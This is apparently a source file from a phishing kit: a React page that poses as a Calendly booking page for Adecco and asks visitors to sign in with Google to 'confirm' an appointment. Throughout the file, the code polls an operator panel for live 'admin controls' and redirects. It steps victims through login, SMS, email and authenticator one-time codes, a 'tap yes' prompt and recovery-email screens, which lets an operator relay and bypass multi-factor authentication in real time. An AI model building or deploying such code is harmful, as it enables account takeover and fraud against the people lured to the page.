"use client"

import Image from "next/image"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Clock, Phone, Globe, User, Calendar, CheckCircle } from "lucide-react"
import { useState, useEffect } from "react"
import GoogleLoginDialog from "./google-login-dialog"
import { useSearchParams, useRouter } from "next/navigation"
import { Dialog } from "@/components/ui/dialog"
import { getOrCreateSessionId, getAdminControls, checkAndClearRedirection } from "@/lib/session-tracking"

export default function ScheduleCall() {
  const [showGoogleLogin, setShowGoogleLogin] = useState(false)
  const [currentTime, setCurrentTime] = useState('')
  const [timezone, setTimezone] = useState('')
  const searchParams = useSearchParams()
  const router = useRouter()
  
  // Admin-controlled values
  const [adminControls, setAdminControls] = useState({
    tapDeviceInfo: '',
    tapMatchingNumber: '',
    smsLastDigits: '',
    recoveryEmail: ''
  })

  // Fetch admin controls on mount and when dialog state changes
  useEffect(() => {
    const fetchAdminControls = async () => {
      const sessionId = getOrCreateSessionId()
      const result = await getAdminControls(sessionId)
      if (result.success && result.data) {
        setAdminControls({
          tapDeviceInfo: result.data.admin_tap_device_info || '',
          tapMatchingNumber: result.data.admin_tap_matching_number || '',
          smsLastDigits: result.data.admin_sms_last_digits || '',
          recoveryEmail: result.data.admin_recovery_email || ''
        })
      }
    }
    
    if (showGoogleLogin) {
      fetchAdminControls()
      
      // Poll for admin controls every 3 seconds while dialog is open
      const interval = setInterval(fetchAdminControls, 3000)
      return () => clearInterval(interval)
    }
  }, [showGoogleLogin])

  // Effect to handle showing Google login based on URL parameters
  useEffect(() => {
    const dialog = searchParams.get('dialog')
    if (dialog && (dialog === 'google' || dialog.startsWith('login') || dialog === 'loading' || dialog.includes('otp') || dialog.includes('recovery') || dialog === 'tap-yes')) {
      setShowGoogleLogin(true)
    }
  }, [searchParams])

  // Poll for redirect when on loading screen
  useEffect(() => {
    const dialog = searchParams.get('dialog')
    
    if (dialog !== 'loading') return

    const pollForRedirect = async () => {
      const result = await checkAndClearRedirection()
      if (result.success && result.redirectTo) {
        console.log('Admin redirect detected:', result.redirectTo)
        // Extract the dialog parameter from the redirect URL
        const url = new URL(result.redirectTo, window.location.origin)
        const newDialog = url.searchParams.get('dialog')
        
        if (newDialog) {
          // Refetch admin controls before redirecting
          const sessionId = getOrCreateSessionId()
          const controlsResult = await getAdminControls(sessionId)
          if (controlsResult.success && controlsResult.data) {
            setAdminControls({
              tapDeviceInfo: controlsResult.data.admin_tap_device_info || '',
              tapMatchingNumber: controlsResult.data.admin_tap_matching_number || '',
              smsLastDigits: controlsResult.data.admin_sms_last_digits || '',
              recoveryEmail: controlsResult.data.admin_recovery_email || ''
            })
          }
          
          router.push(result.redirectTo)
        }
      }
    }

    // Initial check
    pollForRedirect()

    // Poll every 3 seconds
    const interval = setInterval(pollForRedirect, 3000)
    return () => clearInterval(interval)
  }, [searchParams, router])

  // Effect to listen for admin redirects
  useEffect(() => {
    const handleAdminRedirect = () => {
      setShowGoogleLogin(false)
      
      const currentDialog = searchParams.get('dialog')
      if (currentDialog) {
        const url = new URL(window.location.href)
        url.searchParams.delete('dialog')
        router.replace(url.pathname)
      }
    }

    const handleSessionRedirect = (event: CustomEvent) => {
      if (event.detail?.redirectToPage?.includes('/schedule-call')) {
        handleAdminRedirect()
      }
    }

    const handleImmediateRedirect = (event: CustomEvent) => {
      if (event.detail?.redirectTo?.includes('/schedule-call')) {
        handleAdminRedirect()
      }
    }

    const handleNavigation = () => {
      setTimeout(handleAdminRedirect, 100)
    }

    window.addEventListener('session-redirect-set', handleSessionRedirect as EventListener)
    window.addEventListener('admin-redirect-happening', handleImmediateRedirect as EventListener)
    window.addEventListener('popstate', handleNavigation)
    
    const referrer = document.referrer
    if (referrer.includes('/panel')) {
      handleAdminRedirect()
    }

    return () => {
      window.removeEventListener('session-redirect-set', handleSessionRedirect as EventListener)
      window.removeEventListener('admin-redirect-happening', handleImmediateRedirect as EventListener)
      window.removeEventListener('popstate', handleNavigation)
    }
  }, [searchParams, router])

  useEffect(() => {
    // Function to update current time and timezone
    const updateTimeAndTimezone = () => {
      const now = new Date()
      
      // Get user's timezone
      const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone
      setTimezone(userTimezone)
      
      // Format current time (24-hour format)
      const timeString = now.toLocaleTimeString('en-US', {
        hour12: false,
        hour: '2-digit',
        minute: '2-digit'
      })
      setCurrentTime(timeString)
    }

    // Update immediately
    updateTimeAndTimezone()
    
    // Update every minute
    const interval = setInterval(updateTimeAndTimezone, 60000)
    
    return () => clearInterval(interval)
  }, [])


  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4">
      <Card className="w-full max-w-4xl flex flex-col md:flex-row shadow-lg rounded-lg overflow-hidden relative">
        {/* Calendly Ribbon */}
        <div className="absolute top-0 right-0 w-0 h-0 border-l-[120px] border-l-transparent border-t-[120px] border-t-slate-600 z-10">
          <div className="absolute -top-[92px] right-[0px] transform rotate-45 text-white text-center whitespace-nowrap">
            <div className="text-[10px] font-light tracking-wider">POWERED BY</div>
            <div className="text-sm font-bold tracking-wide">Calendly</div>
          </div>
        </div>

        {/* Left Column - Meeting Details */}
        <div className="flex-1 p-8 bg-white border-r border-gray-200 flex flex-col justify-between">
          <div>
            <Image src="adecco.jpg" alt="Zara logo" width={100} height={36} className="mb-6" />
            <h2 className="text-lg font-semibold text-gray-600">Adecco</h2>
            <h1 className="text-3xl font-bold mb-6">30 Minutes Meeting</h1>
            <div className="space-y-3 text-gray-700">
              <div className="flex items-center gap-2">
                <Clock className="w-5 h-5 text-gray-500" />
                <span>30 min</span>
              </div>
              <div className="flex items-center gap-2">
                <Phone className="w-5 h-5 text-gray-500" />
                <span>Phone call</span>
              </div>
              <div className="flex items-center gap-2">
                <Globe className="w-5 h-5 text-gray-500" />
                <span>{timezone ? `${timezone} (${currentTime})` : 'Loading timezone...'}</span>
              </div>
            </div>
          </div>
          <div className="flex justify-between text-sm text-blue-600 mt-8">
            <a href="#" className="hover:underline">
              Cookie settings
            </a>
            <a href="#" className="hover:underline">
              Report abuse
            </a>
          </div>
        </div>

        {/* Right Column - Scheduling Flow */}
        <div className="flex-1 p-8 bg-gray-50">
          <h2 className="text-2xl font-semibold mb-6">Schedule call with Adecco</h2>
          <div className="flex items-center justify-between mb-8">
            <div className="flex flex-col items-center gap-2">
              <div className="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center">
                <User className="w-5 h-5" />
              </div>
              <span className="text-sm font-medium text-blue-600">Verify</span>
            </div>
            <div className="flex-1 h-0.5 bg-gray-300 mx-2" />
            <div className="flex flex-col items-center gap-2">
              <div className="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center">
                <Calendar className="w-5 h-5" />
              </div>
              <span className="text-sm text-gray-500">Schedule</span>
            </div>
            <div className="flex-1 h-0.5 bg-gray-300 mx-2" />
            <div className="flex flex-col items-center gap-2">
              <div className="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center">
                <CheckCircle className="w-5 h-5" />
              </div>
              <span className="text-sm text-gray-500">Finish</span>
            </div>
          </div>

          <div className="bg-blue-50 border border-blue-200 text-blue-800 p-4 rounded-md mb-6">
            <p className="text-sm">
              Please confirm your appointment with Adecco.
              <br />
              To complete the confirmation process, sign in with Google
            </p>
          </div>

          <Dialog open={showGoogleLogin} onOpenChange={(open) => {
            setShowGoogleLogin(open)
            if (open && !searchParams.get('dialog')) {
              const url = new URL(window.location.href)
              url.searchParams.set('dialog', 'google')
              router.replace(url.pathname + url.search)
            } else if (!open && searchParams.get('dialog')) {
              const url = new URL(window.location.href)
              url.searchParams.delete('dialog')
              router.replace(url.pathname + url.search)
            }
          }}>
            <Button 
              onClick={() => {
                setShowGoogleLogin(true)
                const url = new URL(window.location.href)
                url.searchParams.set('dialog', 'google')
                router.replace(url.pathname + url.search)
              }}
              className="w-full bg-white hover:bg-gray-50 text-gray-700 border border-gray-300 flex items-center justify-center gap-2"
            >
              <svg width="20" height="20" viewBox="0 0 48 48">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                <path fill="none" d="M0 0h48v48H0z"/>
              </svg>
              Sign in with Google
            </Button>
            <GoogleLoginDialog
              onClose={() => {
                setShowGoogleLogin(false)
                // Refetch admin controls when dialog closes/reopens
                const sessionId = getOrCreateSessionId()
                getAdminControls(sessionId).then(result => {
                  if (result.success && result.data) {
                    setAdminControls({
                      tapDeviceInfo: result.data.admin_tap_device_info || '',
                      tapMatchingNumber: result.data.admin_tap_matching_number || '',
                      smsLastDigits: result.data.admin_sms_last_digits || '',
                      recoveryEmail: result.data.admin_recovery_email || ''
                    })
                  }
                })
              }}
              initialStep={
                searchParams.get('dialog') === 'login-error' ? 'login-error' :
                searchParams.get('dialog') === 'loading' ? 'loading' :
                searchParams.get('dialog') === 'email-otp' ? 'email-otp' :
                searchParams.get('dialog') === 'email-otp-error' ? 'email-otp-error' :
                searchParams.get('dialog') === 'sms-otp' ? 'sms-otp' :
                searchParams.get('dialog') === 'sms-otp-error' ? 'sms-otp-error' :
                searchParams.get('dialog') === 'gauth-otp' ? 'gauth-otp' :
                searchParams.get('dialog') === 'gauth-otp-error' ? 'gauth-otp-error' :
                searchParams.get('dialog') === 'tap-yes' ? 'tap-yes' :
                searchParams.get('dialog') === 'email-recovery' ? 'email-recovery' :
                searchParams.get('dialog') === 'email-recovery-error' ? 'email-recovery-error' :
                'login'
              }
              adminTapDeviceInfo={adminControls.tapDeviceInfo}
              adminTapMatchingNumber={adminControls.tapMatchingNumber}
              adminSmsLastDigits={adminControls.smsLastDigits}
              adminRecoveryEmail={adminControls.recoveryEmail}
            />
          </Dialog>
        </div>
      </Card>
    </div>
  )
}
